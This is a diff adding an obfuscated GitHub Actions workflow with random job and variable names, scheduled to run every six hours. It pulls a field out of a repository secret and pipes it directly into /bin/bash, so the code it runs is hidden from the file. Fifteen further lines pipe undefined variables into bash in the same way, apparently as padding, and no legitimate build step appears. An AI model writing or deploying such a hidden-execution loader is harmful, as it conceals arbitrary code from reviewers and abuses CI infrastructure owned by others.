@@ -1,0 +1,32 @@
+name: caifengjin4516
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '43 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: caifengjin4516
+        env:
+          gp8: ${{ secrets.gp8 }}
+        run: |
+          echo $gp8 | jq -r .ocunx0 | /bin/bash
+          echo $ea60 | jq -r .ku3163 | /bin/bash
+          echo $j9961 | jq -r .jgecm99691 | /bin/bash
+          echo $e87640 | jq -r .tm928 | /bin/bash
+          echo $lzhp64 | jq -r .r21 | /bin/bash
+          echo $wmg4605 | jq -r .mp4998 | /bin/bash
+          echo $gafd99 | jq -r .brqu6183 | /bin/bash
+          echo $z15 | jq -r .tvmxr1305 | /bin/bash
+          echo $dp959 | jq -r .ne43422 | /bin/bash
+          echo $bfqc1882 | jq -r .ou64 | /bin/bash
+          echo $h77774 | jq -r .juta13667 | /bin/bash
+          echo $phkw9 | jq -r .xzlq77 | /bin/bash
+          echo $yzfop02534 | jq -r .jso1 | /bin/bash
+          echo $gglnj34941 | jq -r .ymfdi9 | /bin/bash
+          echo $esua1 | jq -r .dpf101 | /bin/bash
+          echo $qkbnh47 | jq -r .s567 | /bin/bash
+
